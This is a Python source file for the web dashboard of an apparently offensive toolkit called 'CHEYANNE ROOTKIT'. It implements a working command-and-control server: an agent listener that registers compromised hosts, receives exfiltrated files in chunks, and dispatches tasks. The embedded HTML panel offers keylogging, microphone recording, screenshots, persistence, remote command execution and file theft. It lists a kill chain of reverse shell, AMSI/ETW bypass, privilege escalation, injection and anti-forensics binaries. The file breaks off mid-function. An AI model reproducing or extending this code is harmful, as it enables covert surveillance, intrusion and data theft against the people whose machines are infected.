"""
CHEYANNE ROOTKIT — Web Dashboard
22DIV / george wu
Single-file web UI. No dependencies beyond stdlib.
Usage: python cheyanne_ui.py [port]
"""
import os
import sys
import json
import socket
import struct
import subprocess
import threading
import glob
import re
import hashlib
import time
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from datetime import datetime
from collections import deque

if sys.platform == "win32":
    os.system("")
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

ROOT = os.path.dirname(os.path.abspath(__file__))
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8666
AGENT_PORT = 8667

try:
    from cheyanne_config import VCVARS
except ImportError:
    VCVARS = r"C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"

KILL_CHAIN = [
    {"id": "0", "name": "C2 REVERSE SHELL",     "codename": "ALPHA",   "binary": "shell/vader_shell.exe",           "color": "#FF4444"},
    {"id": "1", "name": "AMSI BYPASS",           "codename": "DELTA",   "binary": "amsi/amsi_hwbp.exe",             "color": "#00FF41"},
    {"id": "2", "name": "ETW BYPASS",            "codename": "FOXTROT", "binary": "etw/etw_hwbp.exe",               "color": "#00FF41"},
    {"id": "3", "name": "PRIVILEGE ESCALATION",  "codename": "GOLF",    "binary": "sideload/svc_replace.exe",        "color": "#FFB000"},
    {"id": "4", "name": "PROCESS INJECTION",     "codename": "HOTEL",   "binary": "injection/vader_inject.exe",      "color": "#4488FF"},
    {"id": "5", "name": "HTTP STAGER",           "codename": "INDIA",   "binary": "stagers/vader_stager.exe",        "color": "#FF2D8A"},
    {"id": "6", "name": "ANTI-FORENSICS",        "codename": "JULIET",  "binary": "forensics/vader_clean.exe",       "color": "#FF2D8A"},
    {"id": "7", "name": "CLOAK",                 "codename": "KILO",    "binary": "cloak/bin/cloak.dll",             "color": "#FFFFFF"},
    {"id": "M", "name": "AUTO-MUTATION",         "codename": "MUTATE",  "binary": "mutate.py",                       "color": "#FFB000"},
]

TOOLS = [
    {"key": "D", "name": "DARK ROOM",    "desc": "Combined AMSI+ETW blind",     "path": "dark_room/dark_room.exe"},
    {"key": "I", "name": "INJECTOR DLL",  "desc": "HWBP propagation payload",    "path": "injection/vader_inject.dll"},
    {"key": "C", "name": "CLOAK LOADER",  "desc": "System-wide concealment",     "path": "cloak/bin/cloak_loader.exe"},
    {"key": "V", "name": "DROPPER",       "desc": "Single-click full kill chain", "path": "cloak/bin/vader_dropper.exe"},
    {"key": "R", "name": "RECON",         "desc": "Defender scanner",            "path": "recon/vader_recon.ps1"},
    {"key": "G", "name": "GHOST ENCODE",  "desc": "Steganographic payload encoder", "path": os.path.join(os.path.dirname(ROOT), "ghost-encoder", "ghost_encode.py")},
    {"key": "P", "name": "DEPLOY",        "desc": "Build + scan + deploy",       "path": "deploy.py"},
]

console_buf = deque(maxlen=2000)
console_lock = threading.Lock()
op_running = threading.Event()
op_name = ""
op_proc = None

agents = {}
agents_lock = threading.Lock()


def agent_send(sock, data):
    raw = json.dumps(data).encode("utf-8")
    sock.sendall(struct.pack(">I", len(raw)) + raw)


def agent_recv(sock):
    hdr = b""
    while len(hdr) < 4:
        chunk = sock.recv(4 - len(hdr))
        if not chunk:
            return None
        hdr += chunk
    length = struct.unpack(">I", hdr)[0]
    if length > 10 * 1024 * 1024:
        return None
    body = b""
    while len(body) < length:
        chunk = sock.recv(min(65536, length - len(body)))
        if not chunk:
            return None
        body += chunk
    return json.loads(body.decode("utf-8"))


def agent_handler(sock, addr):
    agent_id = None
    try:
        msg = agent_recv(sock)
        if not msg or msg.get("type") != "register":
            sock.close()
            return

        agent_id = msg.get("agent_id", uuid.uuid4().hex[:8])
        info = {
            "id": agent_id,
            "addr": f"{addr[0]}:{addr[1]}",
            "hostname": msg.get("hostname", "?"),
            "username": msg.get("username", "?"),
            "os": msg.get("os", "?"),
            "arch": msg.get("arch", "?"),
            "defender": msg.get("defender", "?"),
            "admin": msg.get("admin", False),
            "ip": msg.get("ip", addr[0]),
            "pid": msg.get("pid", 0),
            "sock": sock,
            "connected": True,
            "connected_at": datetime.now().strftime("%H:%M:%S"),
            "last_seen": time.time(),
        }

        with agents_lock:
            agents[agent_id] = info

        console_write(f"[+] Agent connected: {info['hostname']} ({agent_id}) from {addr[0]}")

        while True:
            msg = agent_recv(sock)
            if msg is None:
                break

            msg_type = msg.get("type", "")

            if msg_type == "heartbeat":
                with agents_lock:
                    if agent_id in agents:
                        agents[agent_id]["last_seen"] = time.time()

            elif msg_type == "output":
                line = msg.get("line", "")
                console_write(f"  [{info['hostname']}] {line}")

            elif msg_type == "result":
                status = msg.get("status", "?")
                task_id = msg.get("task_id", "?")
                icon = "+" if status == "ok" else "!"
                console_write(f"[{icon}] [{info['hostname']}] Task {task_id}: {status}")
                data = msg.get("data")
                if data and isinstance(data, dict) and "error" in data:
                    console_write(f"  [{info['hostname']}] Error: {data['error']}")

            elif msg_type == "file_data":
                import base64
                raw = base64.b64decode(msg.get("data", ""))
                task_id = msg.get("task_id", "?")
                orig_name = msg.get("filename", "")
                dl_dir = os.path.join(ROOT, "downloads", agent_id)
                os.makedirs(dl_dir, exist_ok=True)
                if orig_name:
                    ext = os.path.splitext(orig_name)[1]
                    fname = f"{os.path.splitext(orig_name)[0]}_{task_id}{ext}"
                else:
                    fname = f"agent_{agent_id}_{task_id}_{int(time.time())}.bin"
                fpath = os.path.join(dl_dir, fname)
                with open(fpath, "wb") as f:
                    f.write(raw)
                console_write(f"[+] [{info['hostname']}] File saved: {fname} ({len(raw)} bytes)")

            elif msg_type == "file_chunk":
                import base64
                task_id = msg.get("task_id", "?")
                chunk_idx = msg.get("chunk_idx", 0)
                chunk_data = base64.b64decode(msg.get("data", ""))
                total_size = msg.get("total_size", 0)
                filename = msg.get("filename", f"chunk_{task_id}.bin")
                dl_dir = os.path.join(ROOT, "downloads", agent_id)
                os.makedirs(dl_dir, exist_ok=True)
                fpath = os.path.join(dl_dir, filename)
                mode = "wb" if chunk_idx == 0 else "ab"
                with open(fpath, mode) as f:
                    f.write(chunk_data)
                current = os.path.getsize(fpath)
                pct = int(current / total_size * 100) if total_size else 0
                if chunk_idx == 0 or pct % 25 == 0 or current >= total_size:
                    console_write(f"  [{info['hostname']}] SFTP: {filename} {pct}% ({current}/{total_size})")

    except (ConnectionResetError, ConnectionAbortedError, OSError):
        pass
    except Exception as e:
        console_write(f"[!] Agent handler error: {e}")
    finally:
        if agent_id:
            with agents_lock:
                if agent_id in agents:
                    agents[agent_id]["connected"] = False
                    agents[agent_id]["sock"] = None
            console_write(f"[-] Agent disconnected: {agent_id}")
        try:
            sock.close()
        except Exception:
            pass


def agent_listener():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", AGENT_PORT))
    except OSError as e:
        console_write(f"[!] Agent listener failed to bind port {AGENT_PORT}: {e}")
        return
    srv.listen(8)
    console_write(f"[*] Agent listener active on 0.0.0.0:{AGENT_PORT}")
    while True:
        try:
            conn, addr = srv.accept()
            threading.Thread(target=agent_handler, args=(conn, addr), daemon=True).start()
        except Exception:
            pass


def dispatch_task(agent_id, op, **kwargs):
    with agents_lock:
        info = agents.get(agent_id)
        if not info or not info.get("connected") or not info.get("sock"):
            return {"error": "Agent not connected"}

    task_id = uuid.uuid4().hex[:6]
    task = {"type": "task", "id": task_id, "op": op, **kwargs}

    try:
        agent_send(info["sock"], task)
        console_write(f"[>] Dispatched {op} to {info['hostname']} (task {task_id})")
        return {"ok": True, "task_id": task_id}
    except Exception as e:
        console_write(f"[!] Dispatch failed: {e}")
        return {"error": str(e)}


def console_write(line):
    with console_lock:
        ts = datetime.now().strftime("%H:%M:%S")
        console_buf.append(f"[{ts}] {line}")


def get_defender_version():
    for p in sorted(glob.glob(r"C:\ProgramData\Microsoft\Windows Defender\Platform\*"), reverse=True):
        return os.path.basename(p)
    return "unknown"


def check_built(rel_path):
    return os.path.exists(os.path.join(ROOT, rel_path))


def file_size(path):
    try:
        s = os.path.getsize(path)
        if s < 1024:
            return f"{s}B"
        elif s < 1024 * 1024:
            return f"{s / 1024:.0f}KB"
        return f"{s / (1024*1024):.1f}MB"
    except OSError:
        return "?"


def get_xor_key(source_path, key_name="XOR_KEY"):
    path = os.path.join(ROOT, source_path)
    if not os.path.exists(path):
        return None
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            m = re.match(rf'\s*#define\s+{re.escape(key_name)}\s+(0x[0-9A-Fa-f]{{1,2}})', line)
            if m:
                return m.group(1)
    return None


def get_status():
    data = {
        "defender": get_defender_version(),
        "hostname": os.environ.get("COMPUTERNAME", "UNKNOWN"),
        "username": os.environ.get("USERNAME", "UNKNOWN"),
        "op_running": op_running.is_set(),
        "op_name": op_name,
        "kill_chain": [],
        "tools": [],
        "keys": {},
    }
    for phase in KILL_CHAIN:
        full = os.path.join(ROOT, phase["binary"])
        built = os.path.exists(full)
        data["kill_chain"].append({
            **phase,
            "built": built,
            "size": file_size(full) if built else None,
        })
    for tool in TOOLS:
        full = tool["path"] if os.path.isabs(tool["path"]) else os.path.join(ROOT, tool["path"])
        built = os.path.exists(full)
        data["tools"].append({
            **tool,
            "built": built,
            "size": file_size(full) if built else None,
        })

    key_sources = {
        "shell":       ("shell/vader_shell_annotated.c", "XOR_KEY"),
        "dark_room":   ("dark_room/dark_room_annotated.c", "XOR_KEY"),
        "inject":      ("injection/vader_inject_annotated.c", "XOR_KEY"),
        "v4_delta":    ("vectors/v4_svc_replace/svc_replace_annotated.c", "V4_KEY"),
        "v6_foxtrot":  ("vectors/v6_path_hijack/path_hijack_dll_annotated.c", "V6_KEY"),
        "v7_golf":     ("vectors/v7_phantom_dll/phantom_dll_annotated.c", "V7_KEY"),
        "dropper_amsi": ("cloak/vader_dropper.c", "XOR_KEY_AMSI"),
    }
    for name, (src, key) in key_sources.items():
        val = get_xor_key(src, key)
        if val:
            data["keys"][name] = val

    with agents_lock:
        data["agents"] = []
        stale = []
        for aid, a in agents.items():
            if not a["connected"] and time.time() - a.get("last_seen", 0) > 120:
                stale.append(aid)
                continue
            data["agents"].append({
                "id": a["id"],
                "hostname": a["hostname"],
                "username": a["username"],
                "ip": a["ip"],
                "os": a.get("os", "?"),
                "defender": a.get("defender", "?"),
                "admin": a.get("admin", False),
                "connected": a["connected"],
                "connected_at": a.get("connected_at", "?"),
            })
        for aid in stale:
            del agents[aid]

    return data


def cancel_operation():
    global op_proc, op_name
    if op_running.is_set() and op_proc and op_proc.poll() is None:
        try:
            op_proc.kill()
            console_write(f"[!] Killed: {op_name}")
        except Exception:
            pass
    op_running.clear()
    op_proc = None
    op_name = ""
    console_write("[*] Operation lock cleared")


def run_operation(name, cmd, cwd=None):
    global op_name, op_proc
    if op_running.is_set():
        console_write(f"[!] Operation already running: {op_name}")
        return
    op_running.set()
    op_name = name

    def _run():
        global op_name, op_proc
        console_write(f"{'═'*50}")
        console_write(f"  {name}")
        console_write(f"{'═'*50}")
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, cwd=cwd or ROOT, shell=isinstance(cmd, str),
                errors="replace",
            )
            op_proc = proc
            for line in iter(proc.stdout.readline, ""):
                stripped = line.rstrip("\n\r")
                if stripped:
                    clean = re.sub(r'\033\[[0-9;]*m', '', stripped)
                    console_write(clean)
            proc.wait(timeout=300)
            rc = proc.returncode
            console_write(f"[{'+'if rc == 0 else '!'}] Exit code: {rc}")
        except subprocess.TimeoutExpired:
            proc.kill()
            console_write(f"[!] Timed out after 300s — killed")
        except Exception as e:
            console_write(f"[!] Error: {e}")
        finally:
            op_running.clear()
            op_proc = None
            op_name = ""
            console_write(f"{'─'*50}")

    threading.Thread(target=_run, daemon=True).start()


DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CHEYANNE — Command & Control</title>
<style>
:root {
    --bg: #0a0a0a;
    --bg2: #111111;
    --bg3: #1a1a1a;
    --border: #222222;
    --green: #00FF41;
    --green2: #00CC33;
    --amber: #FFB000;
    --red: #FF4444;
    --blue: #4488FF;
    --pink: #FF2D8A;
    --dim: #555555;
    --muted: #888888;
    --text: #CCCCCC;
    --white: #FFFFFF;
}
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    background: var(--bg);
    color: var(--text);
    font-family: 'JetBrains Mono', 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
    font-size: 13px;
    height: 100vh;
    overflow: hidden;
}
.layout {
    display: grid;
    grid-template-columns: 280px 1fr;
    grid-template-rows: auto 1fr auto;
    height: 100vh;
}
header {
    grid-column: 1 / -1;
    background: var(--bg2);
    border-bottom: 1px solid var(--border);
    padding: 12px 20px;
    display: flex;
    align-items: center;
    gap: 20px;
}
.logo {
    color: var(--green);
    font-weight: bold;
    font-size: 18px;
    letter-spacing: 2px;
}
.logo-sub {
    color: var(--dim);
    font-size: 11px;
}
.header-info {
    margin-left: auto;
    display: flex;
    gap: 16px;
    align-items: center;
}
.header-info span {
    font-size: 11px;
}
.tag { padding: 2px 8px; border-radius: 3px; font-size: 10px; font-weight: bold; }
.tag-green { background: rgba(0,255,65,0.15); color: var(--green); }
.tag-red { background: rgba(255,68,68,0.15); color: var(--red); }
.tag-amber { background: rgba(255,176,0,0.15); color: var(--amber); }

.sidebar {
    background: var(--bg2);
    border-right: 1px solid var(--border);
    overflow-y: auto;
    padding-bottom: 20px;
}
.section-title {
    padding: 12px 16px 6px;
    font-size: 10px;
    font-weight: bold;
    letter-spacing: 2px;
    color: var(--dim);
    border-bottom: 1px solid var(--border);
    margin-bottom: 4px;
}
.section-title.green { color: var(--green); }
.section-title.blue { color: var(--blue); }
.section-title.amber { color: var(--amber); }

.chain-item {
    display: grid;
    grid-template-columns: 28px 1fr 50px;
    align-items: center;
    padding: 5px 16px;
    border-bottom: 1px solid rgba(34,34,34,0.5);
    cursor: default;
    transition: background 0.15s;
}
.chain-item:hover { background: var(--bg3); }
.chain-id {
    font-weight: bold;
    font-size: 11px;
    width: 22px;
    height: 22px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 3px;
    background: rgba(255,255,255,0.05);
}
.chain-name { font-size: 11px; padding-left: 6px; }
.chain-codename { font-size: 9px; color: var(--muted); }
.chain-status { text-align: right; font-size: 10px; font-weight: bold; }
.built { color: var(--green); }
.not-built { color: var(--red); }

.tool-item {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 5px 16px;
    border-bottom: 1px solid rgba(34,34,34,0.5);
}
.tool-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    flex-shrink: 0;
}
.tool-dot.on { background: var(--green); box-shadow: 0 0 6px var(--green); }
.tool-dot.off { background: var(--red); }
.tool-key {
    color: var(--blue);
    font-weight: bold;
    font-size: 11px;
    min-width: 16px;
}
.tool-name { font-size: 11px; color: var(--white); min-width: 90px; }
.tool-desc { font-size: 10px; color: var(--dim); }
.tool-size { font-size: 10px; color: var(--muted); margin-left: auto; }

.ops-grid {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 4px;
    padding: 8px 12px;
}
.op-btn {
    background: var(--bg3);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: inherit;
    font-size: 11px;
    padding: 8px 6px;
    border-radius: 4px;
    cursor: pointer;
    transition: all 0.15s;
    text-align: center;
}
.op-btn:hover { border-color: var(--green); color: var(--green); background: rgba(0,255,65,0.05); }
.op-btn:active { transform: scale(0.97); }
.op-btn.running {
    border-color: var(--amber);
    color: var(--amber);
    animation: pulse 1.5s infinite;
}
.op-btn.danger:hover { border-color: var(--red); color: var(--red); background: rgba(255,68,68,0.05); }
.op-btn.full {
    grid-column: 1 / -1;
}
@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.6; }
}

.main {
    display: flex;
    flex-direction: column;
    overflow: hidden;
}
.console-header {
    background: var(--bg2);
    border-bottom: 1px solid var(--border);
    padding: 8px 16px;
    display: flex;
    align-items: center;
    gap: 12px;
}
.console-header h3 {
    font-size: 11px;
    letter-spacing: 2px;
    color: var(--dim);
    font-weight: bold;
}
.console-op {
    font-size: 11px;
    color: var(--amber);
    font-weight: bold;
}
.console-clear {
    margin-left: auto;
    background: none;
    border: 1px solid var(--border);
    color: var(--dim);
    font-family: inherit;
    font-size: 10px;
    padding: 2px 10px;
    border-radius: 3px;
    cursor: pointer;
}
.console-clear:hover { border-color: var(--red); color: var(--red); }
.cancel-btn {
    background: none;
    border: 1px solid var(--red);
    color: var(--red);
    font-family: inherit;
    font-size: 10px;
    padding: 2px 10px;
    border-radius: 3px;
    cursor: pointer;
    display: none;
    animation: pulse-red 1.5s infinite;
}
.cancel-btn:hover { background: var(--red); color: var(--bg); }
@keyframes pulse-red { 0%,100%{opacity:1} 50%{opacity:.5} }
.console {
    flex: 1;
    overflow-y: auto;
    padding: 12px 16px;
    font-size: 12px;
    line-height: 1.6;
    background: var(--bg);
}
.console .line { white-space: pre-wrap; word-break: break-all; }
.console .line.ok { color: var(--green); }
.console .line.err { color: var(--red); }
.console .line.warn { color: var(--amber); }
.console .line.sep { color: var(--dim); }
.console .ts { color: var(--dim); margin-right: 4px; font-size: 10px; }

footer {
    grid-column: 1 / -1;
    background: var(--bg2);
    border-top: 1px solid var(--border);
    padding: 6px 20px;
    display: flex;
    align-items: center;
    gap: 20px;
    font-size: 11px;
}
.footer-item { display: flex; align-items: center; gap: 6px; }
.footer-label { color: var(--dim); }

.agent-item {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 5px 8px;
    border-radius: 4px;
    cursor: pointer;
    transition: background 0.15s;
    margin-bottom: 2px;
}
.agent-item:hover { background: var(--bg3); }
.agent-item.selected { background: var(--bg3); border: 1px solid var(--pink); }
.agent-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    flex-shrink: 0;
}
.agent-dot.alive { background: var(--green); box-shadow: 0 0 6px var(--green); }
.agent-dot.dead { background: var(--red); }
.agent-host { font-size: 11px; color: var(--white); }
.agent-meta { font-size: 9px; color: var(--dim); }
.agent-id { font-size: 10px; color: var(--pink); font-weight: bold; }

.keys-panel {
    padding: 8px 12px;
}
.key-row {
    display: flex;
    justify-content: space-between;
    padding: 3px 4px;
    font-size: 11px;
    border-bottom: 1px solid rgba(34,34,34,0.3);
}
.key-name { color: var(--muted); }
.key-val { color: var(--amber); font-weight: bold; }

::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--bg); }
::-webkit-scrollbar-thumb { background: var(--dim); border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: var(--muted); }

.mobile-toggle {
    display: none;
    background: var(--bg3);
    border: 1px solid var(--border);
    color: var(--green);
    font-family: inherit;
    font-size: 12px;
    padding: 6px 12px;
    border-radius: 4px;
    cursor: pointer;
}

@media (max-width: 768px) {
    .layout {
        grid-template-columns: 1fr;
        grid-template-rows: auto auto 1fr auto;
    }
    .sidebar {
        border-right: none;
        border-bottom: 1px solid var(--border);
        max-height: 0;
        overflow: hidden;
        transition: max-height 0.3s;
    }
    .sidebar.open { max-height: 80vh; overflow-y: auto; }
    .mobile-toggle { display: inline-block; }
    header { flex-wrap: wrap; padding: 8px 12px; gap: 8px; }
    .header-info { width: 100%; justify-content: space-between; }
    .logo { font-size: 15px; }
    .op-btn { padding: 12px 6px; font-size: 12px; }
    .console { font-size: 11px; padding: 8px; }
    .chain-item { padding: 6px 10px; }
    .tool-item { padding: 6px 10px; }
    footer { padding: 4px 10px; font-size: 10px; flex-wrap: wrap; gap: 8px; }
}
</style>
</head>
<body>
<div class="layout">
    <header>
        <div>
            <div class="logo">CHEYANNE</div>
            <div class="logo-sub">COMMAND &amp; CONTROL</div>
        </div>
        <span class="logo-sub">22DIV / george wu</span>
        <div class="header-info">
            <button class="mobile-toggle" onclick="document.querySelector('.sidebar').classList.toggle('open');this.textContent=this.textContent==='MENU'?'CLOSE':'MENU'">MENU</button>
            <span class="tag tag-green" id="statusTag">OPERATIONAL</span>
            <span style="color:var(--dim)">CALLSIGN: <span style="color:var(--white)">CHEYANNE</span></span>
        </div>
    </header>

    <div class="sidebar">
        <div class="section-title green">KILL CHAIN</div>
        <div id="killChain"></div>

        <div class="section-title blue">ARSENAL</div>
        <div id="arsenal"></div>

        <div class="section-title" style="color:var(--pink)">PHASE 1 — BUILD</div>
        <div class="ops-grid">
            <button class="op-btn" onclick="runOp('fresh')" style="border-color:var(--pink);color:var(--pink)">FRESH BUILD</button>
            <button class="op-btn" onclick="runOp('compile')">COMPILE ALL</button>
            <button class="op-btn" onclick="runOp('scan')">SCAN ALL</button>
            <button class="op-btn" onclick="runOp('mutate')">MUTATE KEYS</button>
            <button class="op-btn" onclick="runOp('keystatus')">KEY STATUS</button>
            <button class="op-btn" onclick="runOp('keygen')">REGEN PAYLOAD</button>
        </div>

        <div class="section-title green">PHASE 2 — STEALTH</div>
        <div class="ops-grid">
            <button class="op-btn" onclick="runOp('darkroom')">DARK ROOM</button>
            <button class="op-btn" onclick="runOp('cloak')">BUILD CLOAK</button>
        </div>

        <div class="section-title" style="color:var(--red)">PHASE 3 — DEPLOY</div>
        <div class="ops-grid">
            <button class="op-btn" onclick="runOp('c2shell')" style="border-color:var(--green);color:var(--green)">C2 SHELL</button>
            <button class="op-btn" onclick="runOp('implant')" style="border-color:var(--cyan,#00bcd4)">BUILD IMPLANT</button>
            <button class="op-btn full danger" onclick="runOp('pentest')">FULL PENTEST</button>
        </div>

        <div class="section-title" style="color:var(--cyan,#00bcd4)">PHASE 4 — OPERATE</div>
        <div class="ops-grid">
            <button class="op-btn" onclick="runOp('op_sessions')">SESSIONS</button>
            <button class="op-btn" onclick="runOp('op_screenshot')" style="border-color:#9b59b6">SCREENSHOT</button>
            <button class="op-btn" onclick="runOp('op_browse')">BROWSE FILES</button>
            <button class="op-btn" onclick="runOp('op_exfil')" style="border-color:#27ae60">EXFIL FILE</button>
            <button class="op-btn" onclick="runOp('op_upload')" style="border-color:#27ae60">UPLOAD FILE</button>
            <button class="op-btn" onclick="runOp('op_recon')">RECON</button>
        </div>

        <div class="section-title" style="color:var(--pink)">TCP C2 SHORTCUTS</div>
        <div class="ops-grid">
            <button class="op-btn" onclick="tcpOp('deploy')" style="border-color:var(--red)">DEPLOY</button>
            <button class="op-btn" onclick="tcpOp('screenshot')" style="border-color:#9b59b6">SCREENSHOT</button>
            <button class="op-btn" onclick="tcpOp('watch')" style="border-color:#3498db">WATCH</button>
            <button class="op-btn" onclick="tcpOp('recon')">RECON</button>
            <button class="op-btn" onclick="tcpOp('persist')" style="border-color:var(--red)">PERSIST</button>
            <button class="op-btn" onclick="tcpOp('kill')" style="border-color:var(--red)">KILL PROC</button>
        </div>

        <div class="section-title amber">TOOLKIT</div>
        <div class="ops-grid">
            <button class="op-btn" onclick="runOp('ghost_test')" style="background:#0a1a1a;border-color:#00e5ff">GHOST TEST</button>
            <button class="op-btn" onclick="runOp('handler')" style="border-color:var(--pink)">HANDLER AI</button>
        </div>

        <div class="section-title" style="color:var(--pink)">AGENTS</div>
        <div id="agentPanel" style="padding:4px 12px">
            <div style="color:var(--dim);font-size:11px;padding:4px">No agents connected</div>
        </div>
        <div class="ops-grid" id="agentOps" style="display:none">
            <button class="op-btn" onclick="agentOp('sysinfo')">SYSINFO</button>
            <button class="op-btn" onclick="agentOp('recon')">RECON</button>
            <button class="op-btn" onclick="agentOp('exec')">EXEC CMD</button>
            <button class="op-btn" onclick="agentOp('scan')">SCAN FILE</button>
            <button class="op-btn" onclick="agentOp('ls')">LIST DIR</button>
            <button class="op-btn" onclick="agentOp('screenshot')" style="background:#1a0a2e;border-color:#9b59b6">SCREENSHOT</button>
            <button class="op-btn" onclick="agentOp('mic')" style="background:#1a0a2e;border-color:#9b59b6">MIC REC</button>
            <button class="op-btn" onclick="agentOp('keylog')" style="background:#1a0a2e;border-color:#9b59b6">KEYLOG</button>
            <button class="op-btn" onclick="agentOp('sftp_get')" style="background:#0a1a0a;border-color:#27ae60">SFTP GET</button>
            <button class="op-btn" onclick="agentOp('sftp_put')" style="background:#0a1a0a;border-color:#27ae60">SFTP PUT</button>
            <button class="op-btn" onclick="agentOp('sftp_sync')" style="background:#0a1a0a;border-color:#27ae60">SFTP SYNC</button>
            <button class="op-btn" onclick="agentOp('persist')" style="background:#2a0a0a;border-color:#e74c3c">PERSIST</button>
            <button class="op-btn" onclick="agentOp('vnc')" style="background:#0a0a2a;border-color:#3498db">VNC STREAM</button>
            <button class="op-btn" onclick="agentOp('ping')">PING</button>
        </div>

        <div class="section-title" style="color:var(--muted)">XOR KEYS</div>
        <div class="keys-panel" id="keysPanel"></div>
    </div>

    <div class="main">
        <div class="console-header">
            <h3>CONSOLE</h3>
            <span class="console-op" id="opStatus"></span>
            <button class="cancel-btn" id="cancelBtn" onclick="cancelOp()">CANCEL</button>
            <button class="console-clear" onclick="clearConsole()">CLEAR</button>
        </div>
        <div class="console" id="console"></div>
    </div>

    <footer>
        <div class="footer-item">
            <span class="footer-label">DEFENDER</span>
            <span id="defenderVer" style="color:var(--white)">—</span>
        </div>
        <div class="footer-item">
            <span class="footer-label">RTP</span>
            <span class="tag tag-green">ON</span>
        </div>
        <div class="footer-item">
            <span class="footer-label">DETECTION</span>
            <span class="tag tag-green">ZERO</span>
        </div>
        <div class="footer-item">
            <span class="footer-label">HOST</span>
            <span id="hostName" style="color:var(--white)">—</span>
        </div>
        <div class="footer-item" style="margin-left:auto">
            <span class="footer-label">TARGET</span>
            <span style="color:var(--amber)">OWN HARDWARE ONLY</span>
        </div>
    </footer>
</div>

<script>
let lastConsoleLen = 0;
let pollInterval = null;

function renderKillChain(phases) {
    const el = document.getElementById('killChain');
    el.innerHTML = phases.map(p => `
        <div class="chain-item">
            <div class="chain-id" style="color:${p.color}">${p.id}</div>
            <div>
                <div class="chain-name">${p.name}</div>
                <div class="chain-codename">${p.codename}${p.size ? ' · '+p.size : ''}</div>
            </div>
            <div class="chain-status ${p.built?'built':'not-built'}">${p.built?'BUILT':'—'}</div>
        </div>
    `).join('');
}

function renderTools(tools) {
    const el = document.getElementById('arsenal');
    el.innerHTML = tools.map(t => `
        <div class="tool-item">
            <div class="tool-dot ${t.built?'on':'off'}"></div>
            <span class="tool-key">[${t.key}]</span>
            <span class="tool-name">${t.name}</span>
            <span class="tool-desc">${t.desc}</span>
            ${t.size ? `<span class="tool-size">${t.size}</span>` : ''}
        </div>
    `).join('');
}

function renderKeys(keys) {
    const el = document.getElementById('keysPanel');
    const entries = Object.entries(keys);
    if (!entries.length) {
        el.innerHTML = '<div style="color:var(--dim);font-size:11px;padding:4px">No keys found</div>';
        return;
    }
    el.innerHTML = entries.map(([k,v]) => `
        <div class="key-row">
            <span class="key-name">${k}</span>
            <span class="key-val">${v}</span>
        </div>
    `).join('');
}

function classForLine(text) {
    if (text.includes('[+]')) return 'ok';
    if (text.includes('[!]')) return 'err';
    if (text.includes('[~]')) return 'warn';
    if (/^[═─]{3,}/.test(text.replace(/\[.*?\]\s*/, ''))) return 'sep';
    return '';
}

function renderConsole(lines) {
    const el = document.getElementById('console');
    const wasBottom = el.scrollHeight - el.scrollTop - el.clientHeight < 40;
    if (lines.length !== lastConsoleLen) {
        const newLines = lines.slice(lastConsoleLen);
        const frag = document.createDocumentFragment();
        newLines.forEach(l => {
            const div = document.createElement('div');
            div.className = 'line ' + classForLine(l);
            const tsPart = l.match(/^\[(\d{2}:\d{2}:\d{2})\]\s*/);
            if (tsPart) {
                div.innerHTML = `<span class="ts">${tsPart[1]}</span>${escHtml(l.slice(tsPart[0].length))}`;
            } else {
                div.textContent = l;
            }
            frag.appendChild(div);
        });
        el.appendChild(frag);
        lastConsoleLen = lines.length;
        if (wasBottom) el.scrollTop = el.scrollHeight;
    }
}

function escHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function fetchStatus() {
    try {
        const r = await fetch('/api/status');
        const d = await r.json();
        renderKillChain(d.kill_chain);
        renderTools(d.tools);
        renderKeys(d.keys);
        document.getElementById('defenderVer').textContent = d.defender;
        document.getElementById('hostName').textContent = d.hostname;

        const tag = document.getElementById('statusTag');
        const opEl = document.getElementById('opStatus');
        const cancelBtn = document.getElementById('cancelBtn');
        if (d.op_running) {
            tag.textContent = 'RUNNING';
            tag.className = 'tag tag-amber';
            opEl.textContent = d.op_name;
            cancelBtn.style.display = 'inline-block';
            document.querySelectorAll('.op-btn').forEach(b => {
                if (!b.classList.contains('running')) b.style.opacity = '0.5';
            });
        } else {
            tag.textContent = 'OPERATIONAL';
            tag.className = 'tag tag-green';
            opEl.textContent = '';
            cancelBtn.style.display = 'none';
            document.querySelectorAll('.op-btn').forEach(b => {
                b.classList.remove('running');
                b.style.opacity = '1';
            });
        }
    } catch(e) {}
}

async function fetchConsole() {
    try {
        const r = await fetch('/api/console');
        const d = await r.json();
        renderConsole(d.lines);
    } catch(e) {}
}

async function runOp(name) {
    try {
        const r = await fetch('/api/run/' + name, {method: 'POST'});
        const d = await r.json();
        if (d.error) {
            console.log('Error:', d.error);
        }
        fetchStatus();
    } catch(e) {}
}

async function cancelOp() {
    try {
        await fetch('/api/cancel', {method: 'POST'});
        fetchStatus();
    } catch(e) {}
}

async function clearConsole() {
    await fetch('/api/clear', {method: 'POST'});
    document.getElementById('console').innerHTML = '';
    lastConsoleLen = 0;
}

let selectedAgent = null;

function renderAgents(agentList) {
    const panel = document.getElementById('agentPanel');
    const opsEl = document.getElementById('agentOps');
